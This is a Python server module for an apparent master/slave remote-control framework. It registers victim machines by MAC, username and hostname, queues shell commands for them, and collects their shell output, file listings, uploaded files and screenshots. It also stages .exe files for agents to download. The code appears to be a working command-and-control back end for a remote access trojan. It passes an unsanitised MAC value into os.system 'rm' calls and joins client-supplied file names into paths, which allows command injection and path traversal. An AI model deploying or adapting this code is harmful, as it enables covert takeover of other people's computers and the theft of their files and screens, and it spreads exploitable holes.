import redisutil
import json
import os
import time
import shutil
import hashlib


REDIS_PREFIX_INFO = "INFO"
REDIS_PREFIX_SLAVE_COMMAND = "SLAVE_COMMAND"
REDIS_PREFIX_SLAVE_RESPONSE = "SLAVE_RESPONSE"



def get_formatted_mac(mac):
    return mac.replace(":","_")

#######################################################################
#                           SLAVE METHODs                             #
#######################################################################

def update_info(http_request_obj, slave_command_obj):
    info_json = {
        "ip": http_request_obj.client.host,
        "username": slave_command_obj.username,
        "mac": slave_command_obj.mac,
        "hostname": slave_command_obj.hostname,
        "os": slave_command_obj.os,
        "ostype": slave_command_obj.ostype,
        "timestamp": int(time.time())
    }
    key = f"{REDIS_PREFIX_INFO}_{slave_command_obj.mac}"
    redisutil.set_key_val(key,json.dumps(info_json))

def fetch_slave_command(mac_address):
    key = f"{REDIS_PREFIX_SLAVE_COMMAND}_{mac_address}"
    value = redisutil.get_value_from_key(key)
    
    if value is None:
        return []
    
    value = json.loads(value)
    return value

def del_slave_command_entry_from_redis(mac_address):
    key = f"{REDIS_PREFIX_SLAVE_COMMAND}_{mac_address}"
    redisutil.delete_key(key)


def set_slave_shell_response(slave_text_op_req):
    key = f"{REDIS_PREFIX_SLAVE_RESPONSE}_{slave_text_op_req.mac}"
    
    resp_json = {"content": slave_text_op_req.content}

    redisutil.set_key_val(key,json.dumps(resp_json))

def set_slave_service_response(mac, service_list):
    key = f"{REDIS_PREFIX_SLAVE_RESPONSE}_{mac}"

    service_list = {"services": service_list}

    redisutil.set_key_val(key,json.dumps(service_list))

def set_slave_file_browse_response(slave_file_browse_op_req):
    key = f"{REDIS_PREFIX_SLAVE_RESPONSE}_{slave_file_browse_op_req.mac}"
    
    resp_json = {
        "directories": slave_file_browse_op_req.directories,
        "files": slave_file_browse_op_req.files,
        "working_dir": slave_file_browse_op_req.working_dir
    }

    redisutil.set_key_val(key,json.dumps(resp_json))


def save_slave_file_upload(mac_address, file):
    # Delete slave command entry
    del_slave_command_entry_from_redis(mac_address)

    # Save file to directory
    output_dir = f"{os.getcwd()}/savefile/{mac_address}"
    os.makedirs(output_dir, exist_ok=True)

    # Delete all existing files inside the folder
    os.system(f"rm {output_dir}/*.*")
    os.system(f"rm {output_dir}/*")
    
    full_file_path = f"{output_dir}/{file.filename}"
    with open(full_file_path,"wb") as buffer:
        shutil.copyfileobj(file.file,buffer)

    # Add entry in slave response
    key = f"{REDIS_PREFIX_SLAVE_RESPONSE}_{mac_address}"
    
    resp_json = {"file": file.filename}

    redisutil.set_key_val(key,json.dumps(resp_json))

    return "OK"

# SERVICE ENTRY FUNCTION
def get_slave_command(http_request_obj, slave_command_obj):
    # Update info in redis with latest timestamp
    update_info(http_request_obj, slave_command_obj)

    # Fetch any commands for the slave given by master
    return fetch_slave_command(slave_command_obj.mac)

# SERVICE ENTRY FUNCTION
def set_slave_shell_command_output(slave_text_op_req):
    # Delete slave command entry
    del_slave_command_entry_from_redis(slave_text_op_req.mac)
    

    # Set Slave Response to REDIS
    set_slave_shell_response(slave_text_op_req)
    return {"message":"done"}

# SERVICE ENTRY FUNCTION
def save_service(mac, service_list):
    # Delete slave command entry
    del_slave_command_entry_from_redis(mac)
    
    parsed_service_list = []
    for service in service_list:
        parsed_service_list.append(
            {
                "ServiceName": service.ServiceName,
                "ServiceType": service.ServiceType,
                "StartType": service.StartType,
                "Status" : service.Status
            }
        )
    # Set Slave Response to REDIS
    set_slave_service_response(mac, parsed_service_list)
    return {"message":"done"}

# SERVICE ENTRY FUNCTION
def set_slave_file_browse_command_output(slave_file_browse_op_req):
    # Delete slave command entry
    del_slave_command_entry_from_redis(slave_file_browse_op_req.mac)

    # Set Slave Response to REDIS
    set_slave_file_browse_response(slave_file_browse_op_req)
    return {"message":"done"}


# SERVICE ENTRY FUNCTION
def save_screenshot_from_slave(mac, file):
    output_dir = f"{os.getcwd()}/screenshot"
    os.makedirs(output_dir, exist_ok = True)


    full_file_path = f"{output_dir}/{get_formatted_mac(mac)}.png"
    with open(full_file_path,"wb") as buffer:
        shutil.copyfileobj(file.file,buffer)
    return "OK"

# SERVICE ENTRY FUNCTION
def get_file_hash(folder, filename):
    filename = filename+".exe"
    full_file_path = f"{os.getcwd()}/files/{folder}/{filename}"
    md5_hash = ""
    with open(full_file_path, 'rb') as file_obj:
        file_contents = file_obj.read()
        md5_hash = hashlib.md5(file_contents).hexdigest()
    return md5_hash
    
# SERVICE ENTRY FUNCTION
def get_file_download(folder, filename):
    filename = filename+".exe"
    full_file_path = f"{os.getcwd()}/files/{folder}/{filename}"
    return full_file_path

######################################################################
#                           REDIS CONTROL                            #
######################################################################
def clear_redis():
    redisutil.reset_all()
    return "OK"

def get_redis_full_data():
    data = []
    keys = redisutil.get_all_keys()
    for key in keys:
        value = redisutil.get_value_from_key(key)
        data.append({"key":key, "value": value})
    return data

def delete_key_redis(key):
    redisutil.delete_key(key)
    return "OK"



#######################################################################
#                           MASTER METHODs                            #
#######################################################################

def get_file_download_path(mac,filename):
    file_path = f"{os.getcwd()}/savefile/{mac}/{filename}"
    if os.path.isfile(file_path):
        return file_path
    return None

# SERVICE ENTRY FUNCTION
def list_all_slaves():
    slaves_list= []
    slaves = redisutil.find_all_keys_with_pattern(REDIS_PREFIX_INFO)
    
    if slaves is None:
        return slaves_list
    
    for slave_key in slaves:
        redis_key = str(slave_key, 'UTF-8')
        value = redisutil.get_value_from_key(redis_key)
        value = json.loads(value)
        slaves_list.append(value)
    
    return slaves_list

# SERVICE ENTRY FUNCTION
def set_command_to_slave_from_master(master_command):
    slave_cmd_json = []
    for curr_command in master_command:
        slave_cmd_json.append({
            "type": curr_command.type,
            "command": curr_command.command
        })

    key = f"{REDIS_PREFIX_SLAVE_COMMAND}_{master_command[0].mac}"
    redisutil.set_key_val(key,json.dumps(slave_cmd_json))

# SERVICE ENTRY FUNCTION
def get_response_from_slave_to_master(mac_address):
    key = f"{REDIS_PREFIX_SLAVE_RESPONSE}_{mac_address}"
    
    value = redisutil.get_value_from_key(key)

    if value is None:
        return {"code":404}
    
    response = json.loads(value)
    response['code'] = 200
    return response

# SERVICE ENTRY FUNCTION
def clear_slave_response(mac_address):
    key = f"{REDIS_PREFIX_SLAVE_RESPONSE}_{mac_address}"
    
    redisutil.delete_key(key)
    
    return "OK"

# SERVICE ENTRY FUNCTION
def get_screenshot_from_slave(mac):
    file_path = f"{os.getcwd()}/screenshot/{get_formatted_mac(mac)}.png"
    if os.path.isfile(file_path):
        return file_path
    return None

# SERVICE ENTRY FUNCTION
def check_screenshot_exists(mac):
    file_path = f"{os.getcwd()}/screenshot/{get_formatted_mac(mac)}.png"
    if os.path.isfile(file_path):
        return {'code':200}
    return {'code': 404}

# SERVICE ENTRY FUNCTION
def delete_screenshot(mac):
    file_path = f"{os.getcwd()}/screenshot/{get_formatted_mac(mac)}.png"
    if os.path.isfile(file_path):
        os.remove(file_path)
        return {'code':200}
    return {'code': 404}

# SERVICE ENTRY FUNCTION
def upload_file_for_admin(file, folder, name):
    name = name + ".exe"

    # Create main directory for files
    output_dir = f"{os.getcwd()}/files"
    os.makedirs(output_dir, exist_ok=True)

    # Create sub directory for files
    output_dir = f"{os.getcwd()}/files/{folder}"
    os.makedirs(output_dir, exist_ok=True)

    full_file_path = f"{output_dir}/{name}"
    with open(full_file_path,"wb") as buffer:
        shutil.copyfileobj(file.file,buffer)
    
    return {"message":"File Uploaded Successfully"}
